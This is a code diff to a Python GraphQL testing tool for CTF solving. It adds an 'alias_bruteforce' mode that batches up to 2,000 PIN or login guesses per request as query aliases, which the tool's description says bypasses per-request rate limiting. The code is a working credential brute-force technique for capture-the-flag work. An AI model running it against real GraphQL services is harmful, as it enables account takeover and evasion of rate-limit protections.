@@ -1,7 +1,8 @@
 """
 GraphQL testing tools for CTF solving.
 
-Provides GraphQL introspection and arbitrary query execution capabilities.
+Provides GraphQL introspection, arbitrary query execution, and alias-based
+brute-force capabilities (corCTF 2023 "force" technique).
 """
 
 import json
@@ -593,13 +594,17 @@ class GraphqlQueryTool:
     description: str = (
         "Send a GraphQL query to an endpoint and display the results. "
         "Input must be JSON with keys: 'url' (required, GraphQL endpoint URL), "
-        "'query' (required, GraphQL query string), optional 'variables' (dict), "
-        "optional 'operation_name' (string), optional 'headers' (dict), "
-        "optional 'method' ('POST' or 'GET', default 'POST'), optional 'batch' "
-        "(bool, send as batched query array, default false), optional "
+        "'query' (required unless using alias_bruteforce, GraphQL query string), "
+        "optional 'variables' (dict), optional 'operation_name' (string), optional "
+        "'headers' (dict), optional 'method' ('POST' or 'GET', default 'POST'), "
+        "optional 'batch' (bool, send as batched query array, default false), optional "
         "'batch_count' (int, number of copies for batching, default 1), "
-        "optional 'timeout' (int, default 15). Returns the response data, "
-        "any errors, and highlights flag-like patterns."
+        "optional 'timeout' (int, default 15). "
+        "NEW: 'alias_bruteforce' (dict) for alias-based brute-force. Keys: "
+        "'query_template' (e.g., 'login(pin: \"{value}\") {{ token }}'), "
+        "'values' (list of values to try) OR 'range' ([start, end] for numeric range), "
+        "'batch_size' (int, aliases per request, default 500). "
+        "Bypasses per-request rate limiting by sending many queries as aliases."
     )
 
     def __init__(self, session: Optional[requests.Session] = None) -> None:
@@ -629,6 +634,137 @@ class GraphqlQueryTool:
             return str(value)
 
     # ------------------------------------------------------------------
+    # Alias brute-force (corCTF 2023 "force" technique)
+    # ------------------------------------------------------------------
+
+    def _alias_bruteforce(
+        self,
+        url: str,
+        query_template: str,
+        values: List[str],
+        batch_size: int,
+        headers: Dict[str, str],
+        timeout: int,
+    ) -> str:
+        """
+        Send many GraphQL queries as aliases in a single request.
+
+        Example: query_template = 'login(pin: "{value}") { token }'
+        Values = ["0000", "0001", ...]
+        Produces: { a0: login(pin: "0000") { token }  a1: login(pin: "0001") { token } ... }
+        """
+        lines: List[str] = [
+            "[GraphqlQueryTool] Alias Brute-Force Results",
+            "=" * 50,
+            f"Endpoint: {url}",
+            f"Template: {query_template}",
+            f"Total values: {len(values)}",
+            f"Batch size: {batch_size}",
+            "",
+        ]
+
+        all_flags: List[str] = []
+        interesting_results: List[Dict[str, Any]] = []
+        batch_num = 0
+
+        for i in range(0, len(values), batch_size):
+            batch_num += 1
+            batch_values = values[i : i + batch_size]
+
+            # Build aliased query
+            alias_parts = []
+            for j, val in enumerate(batch_values):
+                alias = f"a{i + j}"
+                # Replace {value} placeholder in template
+                resolved = query_template.replace("{value}", str(val))
+                alias_parts.append(f"{alias}: {resolved}")
+
+            query = "{ " + " ".join(alias_parts) + " }"
+
+            try:
+                resp = self.session.post(
+                    url,
+                    json={"query": query},
+                    headers=headers,
+                    timeout=timeout,
+                )
+                raw_text = resp.text
+
+                # Check for flags in response
+                batch_flags = self._extract_flags(raw_text)
+                all_flags.extend(batch_flags)
+
+                # Parse response
+                try:
+                    body = resp.json()
+                    resp_data = body.get("data") or {}
+                    resp_errors = body.get("errors")
+
+                    # Check each alias for non-null/non-error results
+                    for j, val in enumerate(batch_values):
+                        alias = f"a{i + j}"
+                        result = resp_data.get(alias)
+                        if result is not None and result != {} and result != []:
+                            interesting_results.append({
+                                "value": val,
+                                "alias": alias,
+                                "result": result,
+                            })
+
+                    if resp_errors:
+                        lines.append(
+                            f"Batch {batch_num} ({len(batch_values)} aliases): "
+                            f"{len([r for r in resp_data.values() if r])} hits, "
+                            f"{len(resp_errors)} errors"
+                        )
+                    else:
+                        hits = len([r for r in resp_data.values() if r])
+                        lines.append(
+                            f"Batch {batch_num} ({len(batch_values)} aliases): "
+                            f"{hits} hits"
+                        )
+
+                except (json.JSONDecodeError, ValueError):
+                    lines.append(
+                        f"Batch {batch_num}: non-JSON response "
+                        f"(status {resp.status_code})"
+                    )
+
+            except Exception as exc:
+                lines.append(f"Batch {batch_num}: ERROR - {exc}")
+
+        lines.append("")
+
+        # Report flags
+        if all_flags:
+            unique_flags = list(dict.fromkeys(all_flags))
+            lines.append("!!! FLAGS FOUND !!!")
+            for f in unique_flags:
+                lines.append(f"  {f}")
+            lines.append("")
+
+        # Report interesting results
+        if interesting_results:
+            lines.append(f"INTERESTING RESULTS ({len(interesting_results)}):")
+            for r in interesting_results[:20]:  # Cap display
+                lines.append(
+                    f"  Value: {r['value']} -> {json.dumps(r['result'])[:300]}"
+                )
+            if len(interesting_results) > 20:
+                lines.append(
+                    f"  ... and {len(interesting_results) - 20} more"
+                )
+            lines.append("")
+        else:
+            lines.append("No interesting results found.")
+            lines.append("")
+
+        lines.append(f"Total batches sent: {batch_num}")
+        lines.append(f"Total values tested: {len(values)}")
+
+        return "\n".join(lines)
+
+    # ------------------------------------------------------------------
     # Main entry point
     # ------------------------------------------------------------------
 
@@ -647,6 +783,42 @@ class GraphqlQueryTool:
             return (
                 "[GraphqlQueryTool] Error: 'url' (string) is required "
                 "in the input JSON."
+            )
+
+        # --- Check for alias brute-force mode ---
+        alias_bf = data.get("alias_bruteforce")
+        if alias_bf and isinstance(alias_bf, dict):
+            query_template = alias_bf.get("query_template", "")
+            if not query_template:
+                return (
+                    "[GraphqlQueryTool] Error: alias_bruteforce.query_template "
+                    "is required."
+                )
+            values = alias_bf.get("values") or []
+            value_range = alias_bf.get("range")
+            if value_range and isinstance(value_range, list) and len(value_range) == 2:
+                start, end = int(value_range[0]), int(value_range[1])
+                # Generate zero-padded values if template suggests PIN/code
+                width = len(str(end - 1))
+                values = [str(v).zfill(width) for v in range(start, end)]
+            if not values:
+                return (
+                    "[GraphqlQueryTool] Error: alias_bruteforce requires "
+                    "'values' (list) or 'range' ([start, end])."
+                )
+            batch_size = alias_bf.get("batch_size", 500)
+            try:
+                batch_size = max(1, min(int(batch_size), 2000))
+            except (ValueError, TypeError):
+                batch_size = 500
+            headers = data.get("headers") or {}
+            timeout = data.get("timeout", 30)
+            try:
+                timeout = int(timeout)
+            except (ValueError, TypeError):
+                timeout = 30
+            return self._alias_bruteforce(
+                url, query_template, values, batch_size, headers, timeout
             )
 
         query = data.get("query")
